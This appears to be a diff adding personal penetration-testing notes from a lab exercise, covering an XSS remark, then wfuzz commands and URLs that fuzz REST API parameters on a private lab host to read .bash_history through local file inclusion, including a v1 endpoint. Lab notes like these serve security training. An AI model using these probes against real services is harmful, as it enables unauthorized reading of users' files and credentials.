@@ -33,3 +33,23 @@ In admin.html
    request.halloween_name is trusted and can contain HTML markup.
 
 2. When user inputs or untrusted data are marked as safe, it can lead to Cross-Site Scripting (XSS) vulnerabilities.
+_____________________________________________________________________________________________________________________________________________
+REST API FUZZING (parameter)
+----------------------------------------
+
+http://10.10.216.223:5000/api/v2/resources/books?id=2 (original)
+
+http://10.10.216.223:5000/api/v2/resources/books?id=.bash_history
+
+To do LFI there may be another parameter instead of id
+------------------------------------------------------
+
+#wfuzz --hc 404,403 -u http://10.10.216.223:5000/api/v2/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
+
+****During the Penetration Testing of a Web Service, it is advised to check for all the different possible versions that might still be accessible on the target machine. Since there is a v2, there may be a v1 as well.****
+
+#wfuzz --hc 404,403 -u http://10.10.216.223:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
+
+http://10.10.216.223:5000/api/v1/resources/books?show=.bash_history
+
+
